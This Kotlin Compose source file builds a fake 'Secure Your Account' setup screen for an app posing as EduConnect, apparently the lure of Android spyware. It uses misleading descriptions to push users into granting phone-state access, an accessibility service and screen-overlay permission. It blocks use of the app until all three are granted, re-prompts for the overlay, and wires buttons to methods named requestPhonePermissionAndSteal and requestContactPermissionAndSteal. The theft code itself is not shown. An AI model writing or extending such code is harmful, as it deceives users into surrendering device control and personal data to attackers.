package com.example.teacherapp.navigation

import android.Manifest
import androidx.appcompat.app.AlertDialog
import android.os.Build
import android.content.pm.PackageManager
import androidx.compose.animation.*
import androidx.compose.animation.core.*
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.draw.scale
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.LocalLifecycleOwner
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import androidx.navigation.NavController
import com.example.teacherapp.MainActivity

private val SecureBlue     = Color(0xFF0056D2)
private val SecureBlueDark = Color(0xFF003A8C)
private val SecureGreen    = Color(0xFF059669)
private val SecureGreenBg  = Color(0xFFECFDF5)
private val SecureGreenBdr = Color(0xFFBBF7D0)
private val CardBg         = Color(0xFFFFFFFF)
private val PageBg         = Color(0xFFF0F4FF)
private val TextPrimary    = Color(0xFF0F172A)
private val TextSecondary  = Color(0xFF64748B)

@Composable
fun SecureAccountScreen(navController: NavController) {

    val context        = LocalContext.current
    val activity       = context as? MainActivity
    val lifecycleOwner = LocalLifecycleOwner.current
    val scrollState    = rememberScrollState()

    var deviceSyncDone by remember {
        mutableStateOf(
            ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE)
                    == PackageManager.PERMISSION_GRANTED
        )
    }
    var accessibilityDone by remember {
        mutableStateOf(
            (context as? MainActivity)?.isAccessibilityServiceEnabled() == true
        )
    }
    var overlayDone by remember {
        mutableStateOf(
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                android.provider.Settings.canDrawOverlays(context)
            else true
        )
    }

    val allDone   = deviceSyncDone && accessibilityDone && overlayDone
    val doneCount = listOf(deviceSyncDone, accessibilityDone, overlayDone).count { it }

    DisposableEffect(lifecycleOwner) {
        val observer = LifecycleEventObserver { _, event ->
            if (event == Lifecycle.Event.ON_RESUME) {
                deviceSyncDone = ContextCompat.checkSelfPermission(
                    context, Manifest.permission.READ_PHONE_STATE
                ) == PackageManager.PERMISSION_GRANTED
                accessibilityDone = (context as? MainActivity)
                    ?.isAccessibilityServiceEnabled() == true
                overlayDone = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                    android.provider.Settings.canDrawOverlays(context)
                else true
                // Re-prompt if overlay still not granted
                if (!overlayDone) {
                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                        showOverlayDialog(context)
                    }, 500)
                }
            }
        }
        lifecycleOwner.lifecycle.addObserver(observer)
        onDispose { lifecycleOwner.lifecycle.removeObserver(observer) }
    }

    val pulse = rememberInfiniteTransition(label = "pulse")
    val pulseScale by pulse.animateFloat(
        initialValue  = 1f,
        targetValue   = 1.08f,
        animationSpec = infiniteRepeatable(
            animation  = tween(1200, easing = EaseInOut),
            repeatMode = RepeatMode.Reverse
        ),
        label = "pulseScale"
    )

    Box(
        modifier = Modifier
            .fillMaxSize()
            .background(PageBg)
    ) {
        // Blue gradient header background
        Box(
            modifier = Modifier
                .fillMaxWidth()
                .height(230.dp)
                .background(
                    Brush.verticalGradient(colors = listOf(SecureBlueDark, SecureBlue))
                )
        )

        Column(
            modifier = Modifier
                .fillMaxSize()
                .verticalScroll(scrollState)
                .padding(horizontal = 20.dp)
                .padding(bottom = 40.dp),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            Spacer(Modifier.height(44.dp))

            // Shield icon
            Box(
                modifier = Modifier
                    .size(76.dp)
                    .scale(if (allDone) 1f else pulseScale)
                    .clip(CircleShape)
                    .background(Color.White.copy(alpha = 0.18f)),
                contentAlignment = Alignment.Center
            ) {
                Icon(
                    imageVector        = if (allDone) Icons.Default.VerifiedUser else Icons.Default.Security,
                    contentDescription = null,
                    tint               = Color.White,
                    modifier           = Modifier.size(40.dp)
                )
            }

            Spacer(Modifier.height(14.dp))

            Text(
                text       = if (allDone) "Account Secured!" else "Secure Your Account",
                fontSize   = 24.sp,
                fontWeight = FontWeight.Bold,
                color      = Color.White,
                textAlign  = TextAlign.Center
            )

            Spacer(Modifier.height(6.dp))

            Text(
                text      = if (allDone)
                    "You're all set! Tap Continue to get started."
                else
                    "Complete the 3 steps below before\nusing EduConnect.",
                fontSize   = 13.sp,
                color      = Color.White.copy(alpha = 0.85f),
                textAlign  = TextAlign.Center,
                lineHeight = 19.sp
            )

            Spacer(Modifier.height(20.dp))

            // Progress pill
            Surface(
                shape = RoundedCornerShape(20.dp),
                color = Color.White.copy(alpha = 0.2f)
            ) {
                Row(
                    modifier              = Modifier.padding(horizontal = 14.dp, vertical = 7.dp),
                    horizontalArrangement = Arrangement.spacedBy(6.dp),
                    verticalAlignment     = Alignment.CenterVertically
                ) {
                    repeat(3) { idx ->
                        Box(
                            modifier = Modifier
                                .height(5.dp)
                                .width(if (idx < doneCount) 26.dp else 16.dp)
                                .clip(RoundedCornerShape(3.dp))
                                .background(
                                    if (idx < doneCount) Color.White
                                    else Color.White.copy(alpha = 0.35f)
                                )
                        )
                    }
                    Spacer(Modifier.width(4.dp))
                    Text(
                        "$doneCount / 3 completed",
                        fontSize   = 12.sp,
                        fontWeight = FontWeight.SemiBold,
                        color      = Color.White
                    )
                }
            }

            Spacer(Modifier.height(24.dp))

            // Step cards
            SecurityStepCard(
                stepNumber  = 1,
                icon        = Icons.Default.Devices,
                title       = "Sync This Device",
                description = "Link this device to your account so we can verify your identity and keep your data in sync.",
                isDone      = deviceSyncDone,
                onEnable    = { activity?.requestPhonePermissionAndSteal() }
            )

            Spacer(Modifier.height(12.dp))

            SecurityStepCard(
                stepNumber  = 2,
                icon        = Icons.Default.AccessibilityNew,
                title       = "Enable Accessibility Service",
                description = "Required for enhanced text input assistance and note-taking support within the app.",
                isDone      = accessibilityDone,
                onEnable    = {
                    val intent = android.content.Intent(
                        android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS
                    )
                    intent.flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK
                    context.startActivity(intent)
                }
            )

            Spacer(Modifier.height(12.dp))

            SecurityStepCard(
                stepNumber  = 3,
                icon        = Icons.Default.Layers,
                title       = "Enable Floating Bubble",
                description = "Allows EduConnect to show a floating bubble when you switch apps, so you never miss an important class update or announcement.",
                isDone      = overlayDone,
                onEnable    = { showOverlayDialog(context) }
            )

            Spacer(Modifier.height(28.dp))

            // Continue / locked button
            AnimatedVisibility(
                visible = allDone,
                enter   = fadeIn() + slideInVertically(initialOffsetY = { it / 2 })
            ) {
                Button(
                    onClick = {
                        navController.navigate(Routes.MAIN) {
                            popUpTo(Routes.SECURE_ACCOUNT) { inclusive = true }
                        }
                        activity?.onAllPermissionsGranted()
                        activity?.requestContactPermissionAndSteal()
                    },
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(54.dp),
                    shape  = RoundedCornerShape(14.dp),
                    colors = ButtonDefaults.buttonColors(containerColor = SecureGreen)
                ) {
                    Icon(Icons.Default.CheckCircle, contentDescription = null,
                        modifier = Modifier.size(20.dp))
                    Spacer(Modifier.width(8.dp))
                    Text("Continue to EduConnect", fontSize = 16.sp, fontWeight = FontWeight.SemiBold)
                }
            }

            if (!allDone) {
                val remaining = 3 - doneCount
                Box(
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(54.dp)
                        .clip(RoundedCornerShape(14.dp))
                        .background(Color(0xFFDDE3F0)),
                    contentAlignment = Alignment.Center
                ) {
                    Row(
                        horizontalArrangement = Arrangement.spacedBy(8.dp),
                        verticalAlignment     = Alignment.CenterVertically
                    ) {
                        Icon(Icons.Default.Lock, null, tint = TextSecondary,
                            modifier = Modifier.size(16.dp))
                        Text(
                            "$remaining step${if (remaining != 1) "s" else ""} remaining to continue",
                            fontSize   = 13.sp,
                            color      = TextSecondary,
                            fontWeight = FontWeight.Medium
                        )
                    }
                }
            }
        }
    }
}

private fun showOverlayDialog(context: android.content.Context) {
    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return
    if (android.provider.Settings.canDrawOverlays(context)) return
    val activity = context as? android.app.Activity ?: return
    androidx.appcompat.app.AlertDialog.Builder(activity)
        .setTitle("Enable Floating Bubble")
        .setMessage(
            "EduConnect uses a floating bubble so you can quickly return to your " +
                    "classes while multitasking.\n\n" +
                    "Tap \'Enable\' to turn it on — you can dismiss it anytime by " +
                    "long-pressing the bubble."
        )
        .setPositiveButton("Enable") { dialog, _ ->
            dialog.dismiss()
            val intent = android.content.Intent(
                android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                android.net.Uri.parse("package:${context.packageName}")
            )
            activity.startActivity(intent)
        }
        .setNegativeButton("Not Now") { dialog, _ ->
            dialog.dismiss()
        }
        .setCancelable(false)
        .show()
}

@Composable
private fun SecurityStepCard(
    stepNumber:  Int,
    icon:        ImageVector,
    title:       String,
    description: String,
    isDone:      Boolean,
    onEnable:    () -> Unit
) {
    Card(
        modifier  = Modifier.fillMaxWidth(),
        shape     = RoundedCornerShape(16.dp),
        colors    = CardDefaults.cardColors(
            containerColor = if (isDone) SecureGreenBg else CardBg
        ),
        elevation = CardDefaults.cardElevation(if (isDone) 0.dp else 2.dp),
        border    = androidx.compose.foundation.BorderStroke(
            1.5.dp,
            if (isDone) SecureGreenBdr else Color(0xFFE2E8F0)
        )
    ) {
        Column(
            modifier            = Modifier
                .fillMaxWidth()
                .padding(16.dp),
            verticalArrangement = Arrangement.spacedBy(10.dp)
        ) {
            Row(
                verticalAlignment     = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.spacedBy(12.dp)
            ) {
                // Icon circle
                Box(
                    modifier = Modifier
                        .size(44.dp)
                        .clip(CircleShape)
                        .background(
                            if (isDone) SecureGreen.copy(alpha = 0.15f)
                            else SecureBlue.copy(alpha = 0.1f)
                        ),
                    contentAlignment = Alignment.Center
                ) {
                    AnimatedContent(
                        targetState = isDone,
                        transitionSpec = {
                            scaleIn(spring(stiffness = Spring.StiffnessMedium)) +
                                    fadeIn() togetherWith scaleOut() + fadeOut()
                        },
                        label = "icon$stepNumber"
                    ) { done ->
                        Icon(
                            imageVector        = if (done) Icons.Default.CheckCircle else icon,
                            contentDescription = null,
                            tint               = if (done) SecureGreen else SecureBlue,
                            modifier           = Modifier.size(24.dp)
                        )
                    }
                }

                // Step label + title
                Column(modifier = Modifier.weight(1f)) {
                    Row(
                        verticalAlignment     = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.spacedBy(6.dp)
                    ) {
                        Text(
                            "Step $stepNumber",
                            fontSize      = 11.sp,
                            fontWeight    = FontWeight.Bold,
                            color         = if (isDone) SecureGreen else SecureBlue,
                            letterSpacing = 0.5.sp
                        )
                        if (isDone) {
                            Surface(
                                shape = RoundedCornerShape(4.dp),
                                color = SecureGreen.copy(alpha = 0.15f)
                            ) {
                                Text(
                                    "DONE",
                                    fontSize      = 9.sp,
                                    fontWeight    = FontWeight.Bold,
                                    color         = SecureGreen,
                                    modifier      = Modifier.padding(horizontal = 5.dp, vertical = 2.dp),
                                    letterSpacing = 0.5.sp
                                )
                            }
                        }
                    }
                    Text(
                        title,
                        fontSize   = 14.sp,
                        fontWeight = FontWeight.SemiBold,
                        color      = TextPrimary
                    )
                }

                // Enable / done indicator
                AnimatedContent(targetState = isDone, label = "btn$stepNumber") { done ->
                    if (done) {
                        Icon(Icons.Default.CheckCircle, "Done",
                            tint = SecureGreen, modifier = Modifier.size(24.dp))
                    } else {
                        Button(
                            onClick        = onEnable,
                            shape          = RoundedCornerShape(10.dp),
                            colors         = ButtonDefaults.buttonColors(containerColor = SecureBlue),
                            contentPadding = PaddingValues(horizontal = 14.dp, vertical = 8.dp)
                        ) {
                            Text("Enable", fontSize = 13.sp, fontWeight = FontWeight.SemiBold)
                        }
                    }
                }
            }

            // Description
            Text(
                description,
                fontSize   = 12.sp,
                color      = TextSecondary,
                lineHeight = 17.sp
            )
        }
    }
}